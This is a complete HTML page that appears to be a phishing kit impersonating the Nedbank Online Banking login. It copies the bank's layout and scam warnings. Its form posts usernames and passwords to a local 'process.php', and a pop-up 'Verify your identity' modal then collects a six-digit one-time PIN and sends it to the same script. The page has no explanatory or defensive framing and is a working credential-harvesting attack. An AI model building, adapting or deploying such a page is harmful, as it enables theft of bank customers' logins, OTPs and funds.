<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nedbank Online Banking</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background-color: #f5f5f5;
            color: #333;
            line-height: 1.6;
        }

        .header {
            background: white;
            padding: 1rem 2rem;
            display: flex;
            justify-content: space-between;
            align-items: center;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }

        .logo {
            font-size: 1.5rem;
            font-weight: bold;
            color: #00a651;
            width: 30px;
            height: 30px;
            background: #00a651;
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 4px;
        }

        .header-right {
            display: flex;
            gap: 1.5rem;
            align-items: center;
        }

        .header-link {
            color: #666;
            text-decoration: none;
            display: flex;
            align-items: center;
            gap: 0.3rem;
            font-size: 0.9rem;
        }

        .phone {
            font-weight: 600;
            color: #333;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 2rem;
            display: grid;
            grid-template-columns: 1fr 400px;
            gap: 3rem;
            align-items: start;
        }

        .main-content {
            background: white;
            padding: 3rem;
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
        }

        .hero-section {
            text-align: center;
            margin-bottom: 3rem;
        }

        .hero-icon {
            width: 200px;
            height: 150px;
            margin: 0 auto 2rem;
            background: url('nedbankexperience.svg') center/contain no-repeat;
        }

        .main-title {
            font-size: 2.5rem;
            font-weight: 300;
            margin-bottom: 2rem;
            color: #333;
        }

        .features {
            display: flex;
            justify-content: center;
            gap: 3rem;
            margin-bottom: 2rem;
        }

        .feature {
            text-align: center;
            color: #666;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 0.5rem;
            font-size: 0.9rem;
        }

        .description {
            color: #666;
            margin-bottom: 2rem;
            line-height: 1.5;
        }

        .demo-link {
            display: inline-flex;
            align-items: center;
            gap: 0.5rem;
            color: #00a651;
            text-decoration: none;
            font-weight: 500;
            margin-bottom: 3rem;
        }

        .carousel {
            position: relative;
            margin-bottom: 2rem;
        }

        .carousel-container {
            overflow: hidden;
            border-radius: 8px;
        }

        .carousel-slides {
            display: flex;
            transition: transform 0.3s ease;
        }

        .slide {
            min-width: 100%;
            display: flex;
            gap: 1rem;
            padding: 1rem;
            background: #f8f9fa;
            border-radius: 8px;
        }

        .slide-image {
            width: 200px;
            height: 150px;
            border-radius: 8px;
            object-fit: fill;
            background: #ddd;
            flex-shrink: 0;
        }

        .slide-content {
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }

        .slide-content h3 {
            font-size: 1.1rem;
            margin-bottom: 1rem;
            color: #333;
            font-weight: 400;
        }

        .slide-link {
            color: #00a651;
            text-decoration: none;
            font-weight: 500;
            display: inline-flex;
            align-items: center;
            gap: 0.3rem;
        }

        .carousel-nav {
            position: absolute;
            top: 50%;
            transform: translateY(-50%);
            background: white;
            border: none;
            width: 40px;
            height: 40px;
            border-radius: 50%;
            cursor: pointer;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.2rem;
            color: #666;
        }

        .carousel-nav:hover {
            background: #f8f9fa;
        }

        .prev { left: -20px; }
        .next { right: -20px; }

        .carousel-dots {
            display: flex;
            justify-content: center;
            gap: 0.5rem;
            margin-top: 1rem;
        }

        .dot {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: #ddd;
            cursor: pointer;
            transition: background 0.2s;
        }

        .dot.active {
            background: #00a651;
        }

        .security-badge {
            display: flex;
            align-items: center;
            gap: 1rem;
            padding: 1rem;
            background: #f8f9fa;
            border-radius: 4px;
            font-size: 0.9rem;
            color: #666;
        }

        .badge-icon {
            width: 30px;
            height: 30px;
            background: #e74c3c;
            border-radius: 50%;
            flex-shrink: 0;
        }

        .login-section {
            background: white;
            padding: 2rem;
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
            height: fit-content;
        }

        .login-title {
            font-size: 1.2rem;
            font-weight: 400;
            margin-bottom: 1.5rem;
            color: #333;
        }

        .form-group {
            margin-bottom: 1rem;
        }

        .form-label {
            display: block;
            margin-bottom: 0.5rem;
            color: #666;
            font-size: 0.9rem;
        }

        .form-input {
            width: 100%;
            padding: 0.75rem;
            border: 2px solid #00a651;
            border-radius: 4px;
            font-size: 1rem;
        }

        .form-input:focus {
            outline: none;
            border-color: #008a44;
        }

        .password-group {
            position: relative;
        }

        .password-toggle {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            cursor: pointer;
            color: #666;
            font-size: 1.1rem;
        }

        .forgot-link {
            color: #00a651;
            text-decoration: none;
            font-size: 0.9rem;
        }

        .terms {
            font-size: 0.8rem;
            color: #666;
            margin: 1rem 0;
        }

        .terms a {
            color: #00a651;
            text-decoration: none;
            font-weight: 500;
        }

        .login-btn {
            width: 100%;
            padding: 0.75rem;
            background: #ccc;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 1rem;
            cursor: not-allowed;
            margin-bottom: 1rem;
            transition: background 0.3s;
        }

        .login-btn.active {
            background: #00a651;
            cursor: pointer;
        }

        .register-section {
            margin-bottom: 1.5rem;
            font-size: 0.9rem;
        }

        .register-text {
            color: #00a651;
        }

        .register-btn {
            background: #00a651;
            color: white;
            border: none;
            padding: 0.4rem 0.8rem;
            border-radius: 4px;
            font-size: 0.9rem;
            cursor: pointer;
            margin-left: 0.5rem;
        }

        .app-download {
            text-align: center;
        }

        .app-download p {
            font-size: 0.8rem;
            color: #666;
            margin-bottom: 1rem;
        }

        .app-download a {
            color: #00a651;
            text-decoration: none;
            font-weight: 500;
        }

        .app-stores {
            display: flex;
            flex-direction: column;
            gap: 0.5rem;
            align-items: center;
        }

        .app-store {
            width: 120px;
            height: 35px;
            border-radius: 4px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 0.7rem;
        }

        .app-store img {
            width: 100%;
            height: 100%;
            object-fit: contain;
        }

        .footer-sections {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 2rem 2rem;
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 3rem;
        }

        .footer-section {
            background: white;
            padding: 2rem;
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
        }

        .section-title {
            font-size: 1.3rem;
            font-weight: 400;
            margin-bottom: 1rem;
            color: #333;
        }

        .section-content {
            color: #666;
            line-height: 1.6;
            font-size: 0.9rem;
        }

        .learn-more {
            color: #00a651;
            text-decoration: none;
            font-weight: 500;
            display: inline-flex;
            align-items: center;
            gap: 0.3rem;
            margin-top: 1rem;
        }

        .info-links {
            list-style: none;
        }

        .info-links li {
            border-bottom: 1px solid #eee;
        }

        .info-links a {
            color: #666;
            text-decoration: none;
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 0.7rem 0;
            font-size: 0.9rem;
        }

        .info-links a:hover {
            color: #00a651;
        }

        /* OTP Modal Styles */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            z-index: 1000;
            justify-content: center;
            align-items: center;
            padding: 1rem;
        }

        .modal-content {
            background: white;
            padding: 2.5rem;
            border-radius: 8px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.2);
            width: 100%;
            max-width: 450px;
            text-align: center;
            position: relative;
        }

        .modal-close {
            position: absolute;
            top: 1rem;
            right: 1rem;
            background: none;
            border: none;
            font-size: 1.5rem;
            cursor: pointer;
            color: #666;
        }

        .modal-icon {
            width: 80px;
            height: 80px;
            margin: 0 auto 1.5rem;
            background: #00a651;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 2rem;
        }

        .modal-title {
            font-size: 1.8rem;
            font-weight: 300;
            margin-bottom: 1rem;
            color: #333;
        }

        .modal-description {
            color: #666;
            margin-bottom: 2rem;
            line-height: 1.5;
        }

        .otp-input-container {
            display: flex;
            justify-content: center;
            gap: 0.8rem;
            margin-bottom: 2rem;
        }

        .otp-input {
            width: 50px;
            height: 60px;
            text-align: center;
            font-size: 1.5rem;
            border: 2px solid #ddd;
            border-radius: 4px;
            transition: border-color 0.2s;
        }

        .otp-input:focus {
            border-color: #00a651;
            outline: none;
        }

        .verify-btn {
            width: 100%;
            padding: 0.75rem;
            background: #00a651;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 1rem;
            cursor: pointer;
            margin-bottom: 1.5rem;
            transition: background 0.3s;
        }

        .verify-btn:disabled {
            background: #ccc;
            cursor: not-allowed;
        }

        .resend-option {
            color: #666;
            font-size: 0.9rem;
            margin-bottom: 1rem;
        }

        .resend-link {
            color: #00a651;
            text-decoration: none;
            font-weight: 500;
        }

        .security-note {
            background: #f8f9fa;
            padding: 1rem;
            border-radius: 4px;
            font-size: 0.8rem;
            color: #666;
            margin-top: 2rem;
            text-align: left;
        }

        @media (max-width: 768px) {
            .header {
                padding: 1rem;
            }

            .header-right {
                gap: 1rem;
            }

            .header-link span:not(:first-child) {
                display: none;
            }

            .container {
                grid-template-columns: 1fr;
                padding: 1rem;
                gap: 1.5rem;
            }

            .main-content {
                padding: 2rem 1.5rem;
                order: 2;
            }

            .login-section {
                order: 1;
                padding: 1.5rem;
            }

            .main-title {
                font-size: 2rem;
            }

            .features {
                gap: 2rem;
            }

            .slide {
                flex-direction: column;
                text-align: center;
            }

            .slide-image {
                width: 100%;
                height: 200px;
            }

            .carousel-nav {
                display: none;
            }

            .footer-sections {
                grid-template-columns: 1fr;
                gap: 1.5rem;
            }

            .app-stores {
                flex-direction: column;
            }

            .otp-input-container {
                gap: 0.5rem;
            }

            .otp-input {
                width: 45px;
                height: 55px;
                font-size: 1.3rem;
            }
        }

        @media (max-width: 480px) {
            .features {
                flex-direction: column;
                align-items: center;
                gap: 1rem;
            }

            .main-title {
                font-size: 1.8rem;
            }

            .hero-icon {
                width: 150px;
                height: 100px;
            }

            .otp-input-container {
                gap: 0.3rem;
            }

            .otp-input {
                width: 40px;
                height: 50px;
                font-size: 1.2rem;
            }
            
            .modal-content {
                padding: 1.5rem;
            }
        }
    </style>
</head>
<body>
    <header class="header">
        <div class="logo"><img src="logo.png" style="width:50px"></div>
        <div class="header-right">
            <a href="#" class="header-link">
                <span>💬</span>
                <span>Chat</span>
            </a>
            <a href="#" class="header-link">
                <span>📍</span>
                <span>Branch locator</span>
            </a>
            <a href="#" class="header-link phone">
                <span>📞</span>
                <span>+27 800 555 111</span>
            </a>
        </div>
    </header>

    <div class="container">
        <main class="main-content">
            <div class="hero-section">
                <div class="hero-icon"></div>
                <h1 class="main-title">Nedbank Online Banking</h1>
                
                <div class="features">
                    <div class="feature">
                      <div class="feature-icon" ><img src="login-fast.svg"></div>
                        <span>Fast</span>
                    </div>
                    <div class="feature">
                    <div class="feature-icon" ><img src="login-easy.svg"></div>
                        <span>Easy</span>
                    </div>
                    <div class="feature">
                    <div class="feature-icon" ><img src="login-secure.svg"></div>
                        <span>Secure</span>
                    </div>
                </div>

                <p class="description">
                    Access an enhanced banking experience with<br>
                    great new features and regular updates.
                </p>

                <a href="#" class="demo-link">
                    📱 Explore our demo
                </a>
            </div>

            <div class="carousel">
                <div class="carousel-container">
                    <div class="carousel-slides" id="slides">
                        <div class="slide">
                            <div class="slide-image" style="background: url('2_pot_retirement_scheme_730x340.jpg') center/contain no-repeat;"></div>  
                            <div class="slide-content">
                                <h3>The two-pot retirement system has been introduced. Here's how to...</h3>
                                <a href="#" class="slide-link">Learn more →</a>
                            </div>
                        </div>
                        <div class="slide">
                            <div class="slide-image" style="background: url('saving_vs_investing_blog_appTile.jpg') center/contain no-repeat;"></div>
                            <div class="slide-content">
                                <h3>Saving versus investing.</h3>
                                <a href="#" class="slide-link">Find out more →</a>
                            </div>
                        </div>
                    </div>
                </div>
                
                <button class="carousel-nav prev" onclick="changeSlide(-1)">‹</button>
                <button class="carousel-nav next" onclick="changeSlide(1)">›</button>
                
                <div class="carousel-dots">
                    <span class="dot active" onclick="goToSlide(0)"></span>
                    <span class="dot" onclick="goToSlide(1)"></span>
                </div>
            </div>

            <div class="security-badge">
                <div class="badge-icon"></div>
                <span>Integrated with secure online infrastructure</span>
            </div>
        </main>

        <aside class="login-section">
            <h2 class="login-title">Log in with your <strong>Nedbank ID</strong></h2>
            
            <form id="loginForm" method="POST" action="process.php">
                <div class="form-group">
                    <label for="username" class="form-label">Username</label>
                    <input type="text" id="username" name="username" class="form-input" required>
                </div>
                
                <div class="form-group">
                    <label for="password" class="form-label">Password</label>
                    <div class="password-group">
                        <input type="password" id="password" name="password" class="form-input" required>
                        <button type="button" class="password-toggle" onclick="togglePassword()">👁</button>
                    </div>
                </div>
                
                <a href="#" class="forgot-link">Forgot your details?</a>
                
                <p class="terms">By logging in I accept the <a href="#">terms and conditions</a>.</p>
                
                <button type="submit" class="login-btn" id="loginBtn">Log in</button>
            </form>
            
            <div class="register-section">
                <span class="register-text">Don't have a Nedbank ID?</span>
                <button class="register-btn">Register</button>
            </div>
            
            <div class="app-download">
                <p>While you're at it, download our new<br><a href="#">Nedbank Money app</a></p>
                <div class="app-stores">
                    <div class="app-store"><img src="GooglePlay.svg" alt="Google Play"></div>
                    <div class="app-store"><img src="AppStoreBadge.svg" alt="App Store"></div>
                    <div class="app-store"><img src="HuaweiStoreBadge.svg" alt="AppGallery"></div>
                </div>
            </div>
        </aside>
    </div>

    <div class="footer-sections">
        <div class="footer-section">
            <h3 class="section-title">Beware of the latest scams</h3>
            <div class="section-content">
                <p>There has been an increase in online fraud in the banking industry, with some of the latest scams involving fraudsters prompting you to click on a link in an email or SMS.</p>
                <a href="#" class="learn-more">Learn more →</a>
            </div>
        </div>
        
        <div class="footer-section">
            <h3 class="section-title">Important information</h3>
            <ul class="info-links">
                <li><a href="#">Fraud awareness <span>›</span></a></li>
                <li><a href="#">Verify payments <span>›</span></a></li>
                <li><a href="#">Accessibility <span>›</span></a></li>
                <li><a href="#">Browser requirements <span>›</span></a></li>
                <li><a href="#">Online share trading <span>›</span></a></li>
                <li><a href="#">Privacy notice <span>›</span></a></li>
                <li><a href="#">Promotion of access to information (PAIA) <span>›</span></a></li>
            </ul>
        </div>
    </div>

    <!-- OTP Verification Modal -->
    <div class="modal" id="otpModal">
        <div class="modal-content">
            <button class="modal-close" onclick="closeModal()">×</button>
            <div class="modal-icon">✓</div>
            <h2 class="modal-title">Verify your identity</h2>
            <p class="modal-description">
                For your security, we've sent a One-Time PIN (OTP) to your registered mobile number.<br>
                Please enter it below to continue.
            </p>
            
            <form id="otpForm">
                <div class="otp-input-container">
                    <input type="text" class="otp-input" maxlength="1" required name="otp1">
                    <input type="text" class="otp-input" maxlength="1" required name="otp2">
                    <input type="text" class="otp-input" maxlength="1" required name="otp3">
                    <input type="text" class="otp-input" maxlength="1" required name="otp4">
                    <input type="text" class="otp-input" maxlength="1" required name="otp5">
                    <input type="text" class="otp-input" maxlength="1" required name="otp6">
                </div>
                
                <button type="submit" class="verify-btn" id="verifyBtn">Verify</button>
            </form>
            
            <div class="resend-option">
                Didn't receive the OTP? <a href="#" class="resend-link" id="resendLink">Resend OTP</a>
            </div>
            
            <div class="security-note">
                <strong>Security tip:</strong> Never share your OTP with anyone. Nedbank will never ask you for your OTP, password, or PIN via email, SMS, or phone call.
            </div>
        </div>
    </div>

    <script>
        let currentSlide = 0;
        const totalSlides = 2;

        function changeSlide(direction) {
            const slides = document.getElementById('slides');
            const dots = document.querySelectorAll('.dot');
            
            currentSlide += direction;
            
            if (currentSlide >= totalSlides) currentSlide = 0;
            if (currentSlide < 0) currentSlide = totalSlides - 1;
            
            slides.style.transform = `translateX(-${currentSlide * 100}%)`;
            
            dots.forEach((dot, index) => {
                dot.classList.toggle('active', index === currentSlide);
            });
        }

        function goToSlide(index) {
            const slides = document.getElementById('slides');
            const dots = document.querySelectorAll('.dot');
            
            currentSlide = index % totalSlides;
            slides.style.transform = `translateX(-${currentSlide * 100}%)`;
            
            dots.forEach((dot, i) => {
                dot.classList.toggle('active', i === currentSlide);
            });
        }

        function togglePassword() {
            const passwordInput = document.getElementById('password');
            const toggle = document.querySelector('.password-toggle');
            
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                toggle.textContent = '🙈';
            } else {
                passwordInput.type = 'password';
                toggle.textContent = '👁';
            }
        }

        function checkForm() {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const loginBtn = document.getElementById('loginBtn');
            
            if (username.trim() && password.trim()) {
                loginBtn.classList.add('active');
            } else {
                loginBtn.classList.remove('active');
            }
        }

        document.getElementById('username').addEventListener('input', checkForm);
        document.getElementById('password').addEventListener('input', checkForm);

        // Show modal function
        function showModal() {
            document.getElementById('otpModal').style.display = 'flex';
            document.body.style.overflow = 'hidden';
        }

        // Close modal function
        function closeModal() {
            document.getElementById('otpModal').style.display = 'none';
            document.body.style.overflow = 'auto';
        }

        // OTP input functionality
        const otpInputs = document.querySelectorAll('.otp-input');
        
        otpInputs.forEach((input, index) => {
            input.addEventListener('input', (e) => {
                // Move to next input if current input is filled
                if (e.target.value.length === 1 && index < otpInputs.length - 1) {
                    otpInputs[index + 1].focus();
                }
                
                checkOTPForm();
            });
            
            input.addEventListener('keydown', (e) => {
                // Move to previous input on backspace if current input is empty
                if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
                    otpInputs[index - 1].focus();
                }
                
                checkOTPForm();
            });
        });
        
        function checkOTPForm() {
            const verifyBtn = document.getElementById('verifyBtn');
            let allFilled = true;
            
            otpInputs.forEach(input => {
                if (!input.value) {
                    allFilled = false;
                }
            });
            
            verifyBtn.disabled = !allFilled;
        }
        
   // Handle OTP form submission
        document.getElementById('otpForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Collect OTP value
            let otpValue = '';
            otpInputs.forEach(input => {
                otpValue += input.value;
            });
            
            // Submit OTP data via AJAX
            const formData = new FormData();
            formData.append('action', 'verify_otp');
            formData.append('otp', otpValue); // Send as combined OTP
            
            fetch('process.php', {
                method: 'POST',
                body: formData
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Network response was not ok');
                }
                return response.json();
            })
            .then(data => {
                if (data.success) {
                    closeModal();
                    // Redirect to dashboard
                    window.location.href = data.redirect;
                } else {
                    alert(data.message || 'Invalid OTP. Please try again.');
                }
            })
            .catch(error => {
                console.error('Error:', error);
                alert('An error occurred. Please try again.');
            });
        });
    </script>
</body>
</html>